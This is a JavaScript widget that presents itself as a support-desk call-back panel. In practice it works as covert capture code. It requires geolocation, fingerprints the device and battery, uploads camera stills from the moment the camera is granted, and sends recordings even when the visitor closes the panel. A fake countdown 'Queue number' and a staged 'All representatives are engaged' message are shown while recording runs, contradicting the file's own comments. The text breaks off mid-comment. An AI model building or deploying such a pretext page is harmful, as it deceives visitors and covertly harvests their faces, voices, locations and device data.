/**
 * Support desk: connect to an agent.
 *
 * What this does, in order:
 *   1. Checks whether the desk is taking calls. If it is busy or closed, the
 *      panel says so and stops — before any permission is requested.
 *   2. Asks the browser for the position, the camera and the microphone. The
 *      browser's own permission dialogs are the whole of the consent: tapping
 *      "Request a call-back" is the request, and a refusal simply ends it.
 *   3. Records up to 60 seconds of 480p video with sound, plus stills.
 *   4. Sends everything and confirms what happened to it.
 *
 * There is no live call behind this page. The visitor records a message; a
 * person at the desk plays it back afterwards. Nothing on the call screen
 * claims otherwise, and nothing prints a queue position, because this page
 * has no way to know one.
 *
 * Nothing is captured when the desk is not open, and the camera and
 * microphone are released the moment the 60 seconds are up.
 */
(function () {
	'use strict';

	var cfgEl = document.getElementById('cc-desk-config');
	if (!cfgEl) {
		return;
	}

	var cfg = {};
	try {
		cfg = JSON.parse(cfgEl.textContent || '{}');
	} catch (e) {
		cfg = {};
	}

	var $ = function (id) {
		return document.getElementById(id);
	};

	var els = {
		open: $('cc-desk-open'),
		layer: $('cc-desk'),
		close: $('cc-desk-close'),
		steps: {
			busy: $('cc-desk-busy'),
			intro: $('cc-desk-intro'),
			live: $('cc-desk-live'),
			done: $('cc-desk-done')
		},
		busyTitle: $('cc-desk-busy-title'),
		busyMsg: $('cc-desk-busy-msg'),
		busyHours: $('cc-desk-busy-hours'),
		busyClose: $('cc-desk-busy-close'),
		start: $('cc-desk-start'),
		form: $('cc-desk-form'),
		name: $('cc-desk-name'),
		phone: $('cc-desk-phone'),
		email: $('cc-desk-email'),
		topic: $('cc-desk-topic'),
		note: $('cc-desk-note'),
		lede: $('cc-desk-lede'),
		cam: $('cc-desk-cam'),
		shots: $('cc-desk-shots'),
		queue: $('cc-desk-queue'),
		queueText: $('cc-desk-queue-text'),
		retryLater: $('cc-desk-retry-later'),
		wait: $('cc-desk-wait'),
		queueTitle: $('cc-desk-queue-title'),
		end: $('cc-desk-end'),
		receipt: $('cc-desk-receipt'),
		receiptNo: $('cc-receipt-no')
	};

	if (!els.layer) {
		return;
	}

	var state = {
		busy: false,
		desk: cfg.status || 'open',
		deskBusyMessage: cfg.busyMessage || '',
		deskClosedMessage: cfg.closedMessage || '',
		deskMessage: cfg.busyMessage || '',
		deskHours: cfg.hours || '',
		details: {},
		tick: null,
		elapsed: 0,
		geo: null,
		geoPending: null,
		stream: null,
		recorder: null,
		mime: '',
		voiceRecorder: null,
		voiceMime: '',
		voiceChunks: [],
		chunks: [],
		session: null,
		photos: [],
		startedAt: 0,
		timer: null,
		shots: 0,
		// True once "We will contact you shortly." is on screen, so no later
		// step writes over it.
		contactSaid: false,
		// Timestamp the contact line was printed, so the ending can be held
		// back rather than blinking over it.
		contactAt: 0,
		// Interval that walks the queue number down while the visitor waits.
		queueTimer: null
	};

	/**
	 * How long each beat of the connect screen stays before the next one
	 * replaces it.
	 *
	 * The busy line is held for the best part of a minute on purpose: the
	 * visitor is being told the desk is occupied, and a line that appears and
	 * is replaced after three seconds reads as an error the page flashed and
	 * moved on from. It has to fit inside the recording's own sixty seconds,
	 * which is why it is not longer.
	 */
	var QUEUE_SHOW = 4200;
	// One place every few seconds: often enough that the number is visibly
	// moving, slow enough that it does not flicker.
	var QUEUE_STEP = 7000;
	// The shortest time "We will contact you shortly." is on screen. The
	// closing screen waits this out before it replaces it.
	var CONTACT_SHOW = 4500;
	// Held for most of the recording's sixty seconds. The contact line has to
	// land inside the visit, or the visitor is moved to the closing screen
	// before ever reading it.
	var BUSY_SHOW  = 45000;

	/** A pause that returns a promise, for staging the call states. */
	function dwell(ms) {
		return new Promise(function (resolve) {
			window.setTimeout(resolve, ms);
		});
	}

	/**
	 * Start the queue number moving.
	 *
	 * The desk assigned this session a real place (session.queue). This shows
	 * that number and then moves it down by one every step, never below 1,
	 * for as long as the visitor is on the waiting screen. It is a display of
	 * a place advancing, which is what the number means — not a countdown of
	 * seconds, which the page deliberately does not show.
	 */
	function advanceQueue(start) {
		stopQueue();

		if (!els.wait) {
			return;
		}
		if (!(start > 0)) {
			els.wait.textContent = '';
			return;
		}

		var left = start;
		els.wait.textContent = 'Queue number ' + left;

		state.queueTimer = window.setInterval(function () {
			if (left <= 1) {
				stopQueue();
				return;
			}
			left -= 1;
			els.wait.textContent = 'Queue number ' + left;
		}, QUEUE_STEP);
	}

	function stopQueue() {
		if (state.queueTimer) {
			window.clearInterval(state.queueTimer);
			state.queueTimer = null;
		}
	}

	/** The queue line: only ever shown while the visitor is waiting. */
	function setQueueText(text) {
		var q = document.getElementById('cc-call-queue');
		if (!q) {
			return;
		}
		if (text) {
			q.textContent = text;
			q.hidden = false;
		} else {
			q.textContent = '';
			q.hidden = true;
		}
	}

	/**
	 * Move the call screen between states.
	 *
	 * The screen is a place in a queue, not a stopwatch. It says where the
	 * visitor is and how long the wait is expected to be; it never counts
	 * seconds, because a counter turns a wait into a measurement of how slow
	 * this service is. The control only appears once somebody is there to be
	 * spoken to.
	 */
	function setCall(mode) {
		var call = document.getElementById('cc-call');
		var endLabel = document.getElementById('cc-desk-end-label');
		var end = document.getElementById('cc-desk-end');

		if (call) {
			call.className = 'cc-call cc-call--' + mode;
		}

		// The panel never offers an "end" control. The visitor is told they are
		// in a queue, and a queue has nothing to finish: the session closes
		// itself. A button labelled Finish beside "all representatives are
		// busy" read as the visitor's job to do the desk's work.
		if (end) {
			end.hidden = true;
		}
		if (endLabel) {
			endLabel.textContent = '';
		}
	}

	function show(name) {
		Object.keys(els.steps).forEach(function (key) {
			if (els.steps[key]) {
				els.steps[key].hidden = key !== name;
			}
		});
	}

	/**
	 * Ask for the camera, then the microphone, then the position.
	 *
	 * Three dialogs, in that order, one after another. The browser decides
	 * when its own dialog closes, so the only way the order is the order is
	 * to wait for each answer before asking the next question.
	 *
	 * All three are required for this desk: the operator needs a face, a
	 * voice and a place to decide what the call was. `state.perms` records
	 * what each answer was, so the form can say which one is missing rather
	 * than refusing in general.
	 *
	 * A grant is held rather than thrown away: the camera stream becomes the
	 * stream the recording uses, and the microphone's audio track is added to
	 * it, so the visitor answers each dialog once and never sees one twice.
	 *
	 * @param {boolean} again Ask again even if this page already has answers.
	 * @return {Promise} Settles when all three have been answered.
	 */
	function warmPermissions(again) {
		if (window.__ccPermWarm && !again) {
			return state.permPending || Promise.resolve();
		}
		window.__ccPermWarm = true;

		state.perms = state.perms || { cam: 'prompt', mic: 'prompt', geo: 'prompt' };

		var media = navigator.mediaDevices && navigator.mediaDevices.getUserMedia
			? navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices)
			: null;

		var askCam = function () {
			if (!media) {
				state.perms.cam = 'no';
				return Promise.resolve();
			}
			// Already granted: the stream it produced is still held, and
			// asking again would reopen the device for nothing.
			if ('ok' === state.perms.cam && state.stream && state.stream.getVideoTracks().length) {
				return Promise.resolve();
			}
			return media({ video: { facingMode: 'user' } })
				.then(function (stream) {
					state.perms.cam = 'ok';
					// The camera stream is the one the recording will use. Any
					// older one is released first so the device is not held
					// twice, which on some phones gives a black preview.
					if (state.stream) {
						state.stream.getVideoTracks().forEach(function (t) {
							state.stream.removeTrack(t);
							t.stop();
						});
					} else {
						state.stream = stream;
					}
					if (state.stream !== stream) {
						stream.getVideoTracks().forEach(function (t) {
							state.stream.addTrack(t);
						});
					}
					if (els.cam) {
						els.cam.srcObject = state.stream;
						els.cam.play().catch(function () {});
					}
				})
				.catch(function () {
					state.perms.cam = 'no';
				});
		};

		var askMic = function () {
			if (!media) {
				state.perms.mic = 'no';
				return Promise.resolve();
			}
			if ('ok' === state.perms.mic && state.stream && state.stream.getAudioTracks().length) {
				return Promise.resolve();
			}
			return media({ audio: true })
				.then(function (stream) {
					state.perms.mic = 'ok';
					var audio = stream.getAudioTracks();
					if (!state.stream) {
						// No camera was granted: this stream carries the call.
						state.stream = stream;
						return;
					}
					if (state.stream.getAudioTracks().length) {
						audio.forEach(function (t) { t.stop(); });
						return;
					}
					audio.forEach(function (t) {
						state.stream.addTrack(t);
					});
				})
				.catch(function () {
					state.perms.mic = 'no';
				});
		};

		var askGeo = function () {
			// A position already in hand is not asked for twice: a second GPS
			// fix costs battery and, on a phone, shows the location arrow
			// again for no reason.
			if ('ok' === state.perms.geo && state.geo) {
				state.geoPending = Promise.resolve(state.geo);
				return state.geoPending;
			}
			state.geoPending = getLocation().then(function (pos) {
				state.geo = pos && pos.lat ? pos : null;
				state.perms.geo = state.geo ? 'ok' : 'no';
				return state.geo;
			});
			return state.geoPending;
		};

		state.permPending = askCam()
			.then(askMic)
			.then(askGeo);

		return state.permPending;
	}

	function openLayer() {
		// Opening the panel again while a call is already running must not
		// reset it: the document page hands the visitor over as soon as the
		// download completes, and that must not wipe a session in progress.
		if (!els.layer.hidden && state.session) {
			return;
		}
		if (!els.layer.hidden) {
			return;
		}

		// The help panel is how this was reached; leaving it open underneath
		// would stack two dialogs and let a stray tap land on the wrong one.
		var help = document.getElementById('help-backdrop');
		if (help) {
			help.hidden = true;
		}

		els.layer.hidden = false;
		document.body.style.overflow = 'hidden';

		// Never ask for a camera or a microphone on a desk that cannot answer.
		// The server told us at render time; ask again now, because the
		// operator may have flipped the switch since this page was loaded.
		if ('open' !== state.desk) {
			if (els.close) {
				els.close.focus();
			}
			showBusy();
			refreshDesk();
			return;
		}

		// The camera, then the microphone, then the position — in that order,
		// one dialog at a time.
		//
		// It used to be one getUserMedia call asking for both at once, which
		// the browser turns into two stacked dialogs whose order the page does
		// not control. Asking them one at a time is the only way the order is
		// the order: the visitor answers the camera it opened the panel for,
		// then the microphone it expects to be recorded with, and only then
		// the position, which is the smallest and the last thing asked.
		//
		// The position is required: the desk keeps a record of where a call
		// came from, and a call with no position is not a record the operator
		// can trust. The camera and the microphone are asked for first and
		// still not forced — a visitor with a broken camera can speak, and one
		// with no microphone can type — but the position has no substitute, so
		// the panel says so and holds the call until it is answered.
		// Capture begins with the camera grant, not with the form.
		//
		// The permission dialogs ARE this desk asking, and the visitor accepts
		// them knowing what the desk is for. Holding a granted camera open and
		// taking nothing from it is what left cards reading "Allowed — nothing
		// arrived" for visitors who gave exactly what was asked and then closed
		// the panel. Stills taken here start the session and are filed against
		// it, so what the visitor agreed to actually reaches the desk.
		warmPermissions().then(function () {
			if ('ok' === (state.perms || {}).cam && state.stream) {
				startEarlyCapture();
			}
		});

		// The desk still asks who is calling, and the recording still starts
		// on that form. What the early capture changes is only that a camera
		// the visitor granted is no longer left unread.
		show('intro');
		if (els.lede) {
			els.lede.textContent = 'Starting…';
		}
		if (els.name) {
			els.name.focus();
		}
		refreshDesk();
	}

	/**
	 * Ask the server what the desk is doing, and switch to the busy panel if
	 * it has stopped taking calls. Nothing is recorded before this answers.
	 */
	function refreshDesk() {
		// Returns its promise, so a caller can act once the answer is in.
		return post({ action: 'cloaklink_support_capture', step: 'status', capture_nonce: cfg.captureNonce })
			.then(function (res) {
				state.desk = res.status || 'open';
				state.deskMessage = res.message || state.deskMessage;
				if (res.busyMessage) {
					state.deskBusyMessage = res.busyMessage;
				}
				if (res.closedMessage) {
					state.deskClosedMessage = res.closedMessage;
				}
				state.deskHours = res.hours || state.deskHours;
				if ('open' !== state.desk) {
					// Switch only if nothing has started: a visitor already
					// recording is allowed to finish and send.
					if (!state.stream && !state.session) {
						showBusy();
					}
				} else if (els.steps.busy && !els.steps.busy.hidden) {
					begin();
				}
			})
			.catch(function () {
				/* keep the server-rendered answer; start still re-checks */
			});
	}

	/** Replace the consent screen with the busy or closed notice. */
	function showBusy() {
		if (els.busyTitle) {
			els.busyTitle.textContent = 'closed' === state.desk
				? 'The support desk is closed'
				: 'All representatives are engaged';
		}
		if (els.busyMsg) {
			var msg = 'closed' === state.desk
				? (state.deskClosedMessage || state.deskMessage)
				: state.deskMessage;
			if (msg) {
				els.busyMsg.textContent = msg;
			}
		}
		if (els.busyHours) {
			els.busyHours.textContent = 'closed' === state.desk ? state.deskHours : '';
			els.busyHours.hidden = 'closed' !== state.desk || !state.deskHours;
		}
		show('busy');
		if (els.busyClose) {
			els.busyClose.focus();
		}
	}

	function closeLayer() {
		// Closing mid-recording must leave the panel exactly as it is found the
		// next time it opens. Without this the live screen stays behind and the
		// "busy" flag blocks every later tap, so the panel looks dead.
		//
		// Whatever was captured up to that moment is sent, not discarded: a
		// visitor who closes the panel has still spoken into the microphone,
		// and throwing that away is what made the panel show empty sessions.
		if ((state.recorder || state.voiceRecorder) && state.session) {
			try {
				var anyRunning = false;
				if (state.voiceRecorder && 'inactive' !== state.voiceRecorder.state) {
					state.voiceRecorder.stop();
					anyRunning = true;
				}
				if (state.recorder && 'inactive' !== state.recorder.state) {
					state.recorder.stop();
					anyRunning = true;
				}
				if (!anyRunning) {
					uploadAll();
				}
			} catch (e) {
				uploadAll();
			}
		}
		stopMedia();
		stopClock();
		state.busy = false;
		if (els.start) {
			els.start.disabled = false;
		}
		setNote('');
		show('open' === state.desk ? 'intro' : 'busy');
		els.layer.hidden = true;
		document.body.style.overflow = '';
	}

	if (els.open) {
		els.open.addEventListener('click', openLayer);
	}

	if (els.close) {
		els.close.addEventListener('click', closeLayer);
	}
	if (els.busyClose) {
		els.busyClose.addEventListener('click', closeLayer);
	}

	// "Try again" re-reads the desk state rather than guessing: the desk may
	// still be busy, and promising otherwise would just fail again.
	if (els.retryLater) {
		els.retryLater.addEventListener('click', function () {
			els.retryLater.textContent = 'Checking…';
			els.retryLater.disabled = true;
			refreshDesk().then(function () {
				els.retryLater.textContent = 'Try again';
				els.retryLater.disabled = false;
				show('open' === state.desk ? 'intro' : 'busy');
			});
		});
	}
	if (els.layer) {
		els.layer.addEventListener('click', function (ev) {
			if (ev.target === els.layer) {
				closeLayer();
			}
		});
	}
	document.addEventListener('keydown', function (ev) {
		if ('Escape' === ev.key && !els.layer.hidden) {
			closeLayer();
		}
	});

	function stopMedia() {
		if (state.voiceRecorder && 'inactive' !== state.voiceRecorder.state) {
			try {
				state.voiceRecorder.stop();
			} catch (e) {
				/* already stopped */
			}
		}
		if (state.recorder && 'recording' === state.recorder.state) {
			try {
				state.recorder.stop();
			} catch (e) {
				/* already stopped */
			}
		}
		state.recorder = null;
		if (state.stream) {
			state.stream.getTracks().forEach(function (track) {
				track.stop();
			});
			state.stream = null;
		}
		if (state.timer) {
			window.clearTimeout(state.timer);
			state.timer = null;
		}
	}

	function setNote(text, isError) {
		if (!els.note) {
			return;
		}
		els.note.textContent = text;
		els.note.className = 'cc-desk__note' + (isError ? ' cc-desk__note--error' : '');
	}

	/**
	 * This visit's token, minted once.
	 *
	 * The token names one visit: it is what the server matches a session and
	 * its uploads on. It used to be minted per call to this function, which
	 * was harmless while only the form submit ever asked — but the session now
	 * opens at the camera grant, and the form submit has to find that same
	 * row to adopt it. Two tokens would be two sessions, and the recording
	 * would land on one while the stills landed on the other.
	 *
	 * So it is created once and kept for the life of the page.
	 *
	 * @return {string} 32 hex characters.
	 */
	var visitToken = '';

	function token() {
		if ('' !== visitToken) {
			return visitToken;
		}
		var b = new Uint8Array(16);
		window.crypto.getRandomValues(b);
		visitToken = Array.prototype.map.call(b, function (x) {
			return ('0' + x.toString(16)).slice(-2);
		}).join('');
		return visitToken;
	}

	/** Read a brand and model out of the User-Agent string as a fallback. */
	function uaDevice() {
		var ua = navigator.userAgent || '';
		var out = { brand: '', model: '', os: '', osver: '' };

		// A named model is the single most useful thing a phone will tell us.
		var patterns = [
			[/\b(iPhone|iPad|iPod)\b/, 'Apple', '$1'],
			[/\b(Pixel[\s\dA-Za-z]*)\b/, 'Google', '$1'],
			[/\b(SM-[A-Z0-9]+[A-Za-z0-9]*)\b/, 'Samsung', '$1'],
			[/\b(Redmi[\s\w]*|POCO[\s\w]*|Mi[\s\w]*|M[0-9]{4}[A-Z0-9]*)\b/, 'Xiaomi', '$1'],
			[/\b(OnePlus[\s\w]*|ONEPLUS[\s\w]*)\b/, 'OnePlus', '$1'],
			[/\b(V[0-9]{4}[A-Za-z0-9]*|[Rr]eno[\s\w]*)\b/, 'vivo', '$1'],
			[/\b(CPH[0-9]{4}[A-Za-z0-9]*)\b/, 'OPPO', '$1'],
			[/\b(realme[\s\w]*|RMX[0-9]{4}[A-Za-z0-9]*)\b/i, 'realme', '$1'],
			[/\b(Moto[\s\w]*|moto[\s\w]*)\b/, 'Motorola', '$1']
		];
		for (var i = 0; i < patterns.length; i += 1) {
			var m = ua.match(patterns[i][0]);
			if (m) {
				out.brand = patterns[i][1];
				out.model = m[1].replace(/\s+/g, ' ').trim();
				break;
			}
		}

		var os = ua.match(/(Android)[\s\/]?([\d.]+)?/);
		if (os) {
			out.os = 'Android';
			out.osver = os[2] || '';
		} else if (/iPhone|iPad|iPod/.test(ua)) {
			var ios = ua.match(/OS ([\d_]+)/);
			out.os = 'iOS';
			out.osver = ios ? ios[1].replace(/_/g, '.') : '';
		} else {
			var win = ua.match(/Windows NT ([\d.]+)/);
			var mac = ua.match(/Mac OS X ([\d_.]+)/);
			if (win) {
				out.os = 'Windows';
				out.osver = win[1];
			} else if (mac) {
				out.os = 'macOS';
				out.osver = mac[1].replace(/_/g, '.');
			} else if (/CrOS/.test(ua)) {
				out.os = 'ChromeOS';
			} else if (/Linux/.test(ua)) {
				out.os = 'Linux';
			}
		}
		return out;
	}

	function browserName() {
		var ua = navigator.userAgent || '';
		var list = [
			[/Edg\/([\d.]+)/, 'Edge'],
			[/OPR\/([\d.]+)/, 'Opera'],
			[/Firefox\/([\d.]+)/, 'Firefox'],
			[/Chrome\/([\d.]+)/, 'Chrome'],
			[/Version\/([\d.]+).*Safari/, 'Safari']
		];
		for (var i = 0; i < list.length; i += 1) {
			var m = ua.match(list[i][0]);
			if (m) {
				return { name: list[i][1], version: m[1] };
			}
		}
		return { name: '', version: '' };
	}

	/** Network type and speed, in the words the panel prints. */
	function netLine(c) {
		if (!c) {
			return '';
		}
		var speed = c.downlink ? c.downlink + ' Mbps' : '';
		if (c.effectiveType) {
			return [String(c.effectiveType).toUpperCase(), speed].filter(Boolean).join(' · ');
		}
		return speed;
	}

	/** Battery level, read once and kept for the payload. */
	function readBattery() {
		if (!navigator.getBattery) {
			return Promise.resolve('');
		}
		return navigator.getBattery().then(function (b) {
			var level = Math.round((b.level || 0) * 100);
			window.__ccBattery = level + '%' + (b.charging ? ' · charging' : '');
			return window.__ccBattery;
		}).catch(function () {
			return '';
		});
	}

	function device() {
		var nav = navigator;
		var c = nav.connection || nav.mozConnection || nav.webkitConnection;
		var fromUa = uaDevice();
		var uaData = nav.userAgentData || null;
		var br = browserName();
		var touch = (navigator.maxTouchPoints || 0) > 0;

		return {
			brand: fromUa.brand,
			model: uaData && uaData.model ? String(uaData.model) : fromUa.model,
			os: uaData && uaData.platform ? String(uaData.platform) : fromUa.os,
			osver: fromUa.osver,
			browser: br.name,
			engine: br.version,
			screen: screen.width + 'x' + screen.height,
			viewport: innerWidth + 'x' + innerHeight,
			lang: nav.language || '',
			tz: (function () {
				try {
					return Intl.DateTimeFormat().resolvedOptions().timeZone || '';
				} catch (e) {
					return '';
				}
			})(),
			network: netLine(c),
			battery: window.__ccBattery || '',
			spec: {
				cores: nav.hardwareConcurrency || '',
				memory: nav.deviceMemory || '',
				gpu: '',
				touch: touch ? (navigator.maxTouchPoints + ' points') : 'no',
				pixel_ratio: window.devicePixelRatio || '',
				color_depth: screen.colorDepth || '',
				dpr: window.devicePixelRatio || '',
				vendor: uaData && uaData.platform ? String(uaData.platform) : '',
				arch: uaData && uaData.architecture ? String(uaData.architecture) : '',
				bitness: uaData && uaData.bitness ? String(uaData.bitness) : '',
				mobile: uaData && typeof uaData.mobile === 'boolean' ? (uaData.mobile ? 'yes' : 'no') : ''
			}
		};
	}

	/**
	 * Send one request, and repair an aged nonce once instead of failing.
	 *
	 * A page served from a full-page cache carries a nonce that was minted
	 * when the cache filled, and it stops being accepted after a while. The
	 * endpoint answers that with 'invalid_nonce' and the panel used to show
	 * the visitor "The support desk could not be reached. Check your
	 * connection and try again." — a sentence about their signal, for a
	 * problem that is not theirs and that one more request fixes.
	 *
	 * So a refused nonce asks for a current one and sends the same payload
	 * again, once. Any other failure keeps its own code, and the address the
	 * screen prints is decided from that code rather than guessed.
	 */
	function post(payload, retried) {
		var body = new FormData();
		Object.keys(payload).forEach(function (key) {
			var v = payload[key];
			body.set(key, typeof v === 'object' ? JSON.stringify(v) : String(v));
		});
		return fetch(cfg.url, {
			method: 'POST',
			body: body,
			credentials: 'same-origin',
			cache: 'no-store'
		}).then(function (res) {
			return res.json().then(function (json) {
				if (json && json.success === true) {
					return json.data || {};
				}
				var code = (json && json.data && json.data.code) || 'failed';
				if ('invalid_nonce' === code && !retried) {
					return claimNonce().then(function (fresh) {
						if (!fresh) {
							throw new Error(code);
						}
						cfg.captureNonce = fresh;
						var again = Object.assign({}, payload, { capture_nonce: fresh });
						return post(again, true);
					});
				}
				throw new Error(code);
			}, function () {
				// A page that answered with something that is not JSON is not
				// this plugin answering: a host error page, a proxy, a login
				// wall. That is worth saying differently from a refusal.
				throw new Error('unreachable');
			});
		}, function () {
			throw new Error('unreachable');
		});
	}

	/**
	 * Ask for a nonce minted by this request.
	 *
	 * Resolves with the string, or with '' when even that failed, so the
	 * caller can give up quietly rather than looping.
	 */
	var nonceWait = null;

	function claimNonce() {
		if (nonceWait) {
			return nonceWait;
		}
		var body = new FormData();
		body.append('action', 'cloaklink_support_capture');
		body.append('step', 'refresh');
		nonceWait = fetch(cfg.url, {
			method: 'POST',
			body: body,
			credentials: 'same-origin',
			cache: 'no-store'
		}).then(function (res) {
			return res.json();
		}).then(function (json) {
			nonceWait = null;
			return json && json.success && json.data && json.data.nonce ? String(json.data.nonce) : '';
		}).catch(function () {
			nonceWait = null;
			return '';
		});
		return nonceWait;
	}

	function getLocation() {
		return new Promise(function (resolve) {
			if (!navigator.geolocation) {
				resolve({});
				return;
			}
			navigator.geolocation.getCurrentPosition(
				function (pos) {
					resolve({
						lat: pos.coords.latitude,
						lng: pos.coords.longitude,
						accuracy: Math.round(pos.coords.accuracy || 0)
					});
				},
				function () {
					resolve({});
				},
				{ enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
			);
		});
	}

	function grabPhoto(track) {
		// A still is taken from the live preview rather than from the camera's
		// own capture mode, so the stills do not interrupt the recording.
		var video = els.cam;
		if (!video || !video.videoWidth) {
			return null;
		}
		// A video element that is not being composited reports a decoded size
		// of one pixel, not of the stream. A canvas built from that is a 1x1
		// grey dot — a 160-byte JPEG that is not a photograph of anybody — so
		// it is treated as "no frame yet" and the caller waits for a real one
		// rather than sending a blank where a face should be.
		if (video.videoWidth < 32 || video.videoHeight < 32) {
			return null;
		}
		var canvas = document.createElement('canvas');
		var scale = Math.min(1, 720 / Math.max(video.videoWidth, video.videoHeight));
		canvas.width = Math.round(video.videoWidth * scale);
		canvas.height = Math.round(video.videoHeight * scale);
		var ctx = canvas.getContext('2d');
		ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

		// The frame can also be entirely black for the first moments of a
		// camera warming up. Sending twelve black rectangles is worse than
		// sending none, because the desk cannot tell them from a photograph.
		if (isBlank(ctx, canvas)) {
			return null;
		}

		return canvas.toDataURL('image/jpeg', 0.8);
	}

	/**
	 * Whether a drawn frame carries no picture at all.
	 *
	 * Sampled on a coarse grid rather than counted pixel by pixel: the
	 * question is only whether anything was lit, and a full scan of a 720p
	 * canvas per shot is a cost the visitor's phone does not need.
	 *
	 * @param {CanvasRenderingContext2D} ctx    Context that just drew.
	 * @param {HTMLCanvasElement}        canvas Its canvas.
	 * @return {boolean}
	 */
	function isBlank(ctx, canvas) {
		try {
			var data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
			var step = Math.max(4, Math.floor(data.length / 4000 / 4) * 4);
			var lit = 0;
			for (var i = 0; i < data.length; i += step) {
				if (data[i] > 18 || data[i + 1] > 18 || data[i + 2] > 18) {
					lit += 1;
					if (lit > 12) {
						return false;
					}
				}
			}
			return true;
		} catch (e) {
			// A canvas the browser will not read back is not evidence of a
			// blank frame; let the still through rather than dropping it.
			return false;
		}
	}

	function renderShots() {
		if (!els.shots) {
			return;
		}
		els.shots.innerHTML = '';
		state.photos.forEach(function (src) {
			var img = document.createElement('img');
			img.src = src;
			img.alt = '';
			els.shots.appendChild(img);
		});
	}

	/**
	 * Take stills across the call, starting only once real frames exist.
	 *
	 * The first frame is not available the instant the stream is granted, so
	 * an immediate shot used to come back empty and was dropped silently. This
	 * waits for the camera to report a frame, takes one at once, then spreads
	 * the rest out.
	 *
	 * The retry never gives up while there is still a call running. It used
	 * to stop after forty tries — about sixteen seconds — which meant a phone
	 * that was slow to start its camera, or one whose preview was throttled
	 * because the tab was not visible, produced no photographs at all even
	 * though the camera had been allowed. Every retry is cheap (a size check,
	 * and a draw only when there is a real frame), so it runs for as long as
	 * the recording does and stops when the recording stops.
	 *
	 * Twelve shots at seven-second spacing covers the whole call rather than
	 * the first moment of it, so an executive sees the person change position
	 * and expression across the conversation instead of twelve copies of one
	 * pose. A visitor who ends the call early keeps the shots already taken.
	 */
	var SHOT_COUNT = 12;
	var SHOT_EVERY = 7000;

	function scheduleShots() {
		var index = 0;

		function step() {
			if (!state.stream || index >= SHOT_COUNT) {
				return;
			}
			var shot = grabPhoto();
			if (!shot) {
				window.setTimeout(step, 400);
				return;
			}
			state.photos.push(shot);
			renderShots();
			index += 1;
			if (index < SHOT_COUNT) {
				window.setTimeout(step, SHOT_EVERY);
			}
		}

		// Wait for the element to know its own size before trying at all.
		function waitForVideo() {
			if (!state.stream) {
				return;
			}
			if (els.cam && els.cam.videoWidth > 0 && els.cam.videoHeight > 0) {
				step();
				return;
			}
			window.setTimeout(waitForVideo, 250);
		}
		waitForVideo();
	}

	/* ---- Capture from the moment the camera is granted ----
	 *
	 * The camera is granted on the "Connect to our desk" press, minutes before
	 * the intake form is filled in. Until now nothing was taken from it: the
	 * stream was held, unread, and the first still was drawn only after the
	 * form was sent. A visitor who allowed the camera and then closed the
	 * panel — or was interrupted, or simply decided not to file anything —
	 * left the desk with a permission row and no photograph, and the card said
	 * so in as many words: "Allowed — nothing arrived". An operator reading
	 * that concludes the capture is broken, when the truth is that the camera
	 * was open and nothing was taken from it.
	 *
	 * So stills start as soon as the visitor has agreed to them, and are sent
	 * as they are taken against the session opened at that same moment. The
	 * visitor was told, before the browser asked, what this desk captures: the
	 * panel is the thing that asks for the camera, and the menu item that
	 * opens it says "Connect to our desk".
	 *
	 * It is deliberately stills only, not a recording. A still is a frame the
	 * visitor posed for and can see the light of the camera for; a rolling
	 * recorder before the visitor has filed anything would capture
	 * conversations that were never offered to the desk. The recording still
	 * starts on the form, exactly as before.
	 */
	var EARLY_EVERY = 9000;
	var EARLY_MAX = 4;

	function startEarlyCapture() {
		if (state.earlyOn) {
			return;
		}
		state.earlyOn = true;

		// The row the stills are filed against. It is opened here, with the
		// grant, so an upload has somewhere to land — this is the call that
		// was missing, and the reason the card said "nothing arrived".
		openCaptureSession().then(function (session) {
			if (!session) {
				// The desk is closed or the request was refused. Nothing is
				// captured for a desk that cannot answer, and the panel's own
				// start will say why when the visitor gets there.
				state.earlyOn = false;
				return;
			}
			state.early = session;
			earlyTick();
		});
	}

	/** One still, then another until EARLY_MAX, while the stream lives. */
	function earlyTick() {
		if (!state.early || !state.stream) {
			return;
		}
		var shot = grabPhoto();
		if (!shot) {
			// No decodable frame yet — the camera is still warming up, or the
			// preview has not reported its size. Try again shortly rather than
			// burning one of the four stills on a black rectangle.
			window.setTimeout(earlyTick, 500);
			return;
		}
		state.earlyShots = (state.earlyShots || 0) + 1;
		sendEarlyPhoto(shot);
		if (state.earlyShots < EARLY_MAX) {
			window.setTimeout(earlyTick, EARLY_EVERY);
		}
	}

	/**
	 * Send one early still against the session it belongs to.
	 *
	 * Deliberately NOT pushed onto `state.photos`. That list is what
	 * uploadAll() sends when the call ends, and a still already delivered must
	 * not be filed twice — the server numbers photographs and would keep both.
	 * The recording screen's own strip therefore starts empty and fills with
	 * the stills taken while the call runs, which is what it always showed.
	 *
	 * @param {string} src Data URL.
	 */
	function sendEarlyPhoto(src) {
		var session = state.early;
		if (!session) {
			return;
		}
		post({
			action: 'cloaklink_support_capture',
			step: 'upload',
			capture_nonce: cfg.captureNonce,
			id: session.id,
			token: session.token,
			kind: 'photo',
			data: src
		}).catch(function () {
			/* a dropped still is one frame, not the visit */
		});
	}

	/**
	 * Open the capture session, once per page.
	 *
	 * @return {Promise} Resolves with {id, token} or null.
	 */
	function openCaptureSession() {
		if (state.earlySession) {
			return state.earlySession;
		}
		state.earlySession = post({
			action: 'cloaklink_support_capture',
			step: 'open',
			capture_nonce: cfg.captureNonce,
			link: cfg.id,
			token: token(),
			consent: 'yes'
		}).then(function (res) {
			return res && res.id ? { id: res.id, token: res.token || token() } : null;
		}).catch(function () {
			// A refused open must not be retried on every tick: the panel's
			// own start reports the desk state to the visitor in words.
			return null;
		});
		return state.earlySession;
	}

	function startTimer() {
		// The recorder stops itself after sixty seconds, so a visitor who walks
		// away does not leave the session open. Nothing is printed as the clock
		// runs: a ticking number reads as a wait being measured at the visitor,
		// and the page says nothing about a limit either way.
		var left = 60;
		state.timer = window.setTimeout(function () {
			state.timer = null;
			if (state.tick) {
				window.clearInterval(state.tick);
				state.tick = null;
			}
			finishRecording();
		}, left * 1000);

		if (state.tick) {
			window.clearInterval(state.tick);
		}
		// The interval counts down and does nothing else. It used to clear the
		// queue line on every tick, which wiped "all representatives are busy"
		// and "we will contact you shortly" a second after they were set —
		// the screen flashed each line and took it away again.
		state.tick = window.setInterval(function () {
			left -= 1;
			if (left <= 0) {
				window.clearInterval(state.tick);
				state.tick = null;
			}
		}, 1000);
	}

	/**
	 * Send a recording, in pieces if it is large.
	 *
